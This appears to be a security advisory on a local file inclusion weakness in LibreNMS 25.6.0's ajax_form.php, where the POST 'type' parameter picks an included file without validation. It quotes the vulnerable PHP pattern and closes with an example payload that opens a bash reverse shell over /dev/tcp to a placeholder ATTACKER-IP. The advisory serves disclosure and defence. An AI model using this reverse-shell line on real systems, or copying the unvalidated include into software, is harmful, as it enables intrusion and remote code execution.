## Summary

LibreNMS 25.6.0 contains an architectural vulnerability in the `ajax_form.php` endpoint that permits Local File Inclusion (LFI) based on user-controlled POST input. 

The application directly uses the `type` parameter to dynamically include `.inc.php` files from the trusted path `includes/html/forms/`, without validation or allowlisting:

```php
if (file_exists('includes/html/forms/' . $_POST['type'] . '.inc.php')) {
    include_once 'includes/html/forms/' . $_POST['type'] . '.inc.php';
}
```
This pattern introduces a latent Remote Code Execution (RCE) vector if an attacker can stage a file in this include path â€” for example, via symlink, development misconfiguration, or chained vulnerabilities.

>  This is not an arbitrary file upload bug. But it does provide a powerful execution sink for attackers with write access (direct or indirect) to the include directory.

---

## Conditions for Exploitation

- Attacker must be authenticated    
- Attacker must control a file at `includes/html/forms/{type}.inc.php` (or symlink)        

## Example Impact (RCE)

If a PHP file or symlinked shell is staged in the include path, an attacker can achieve full remote code execution under the `librenms` user context:

```php
<?php system('/bin/bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"'); ?>
```
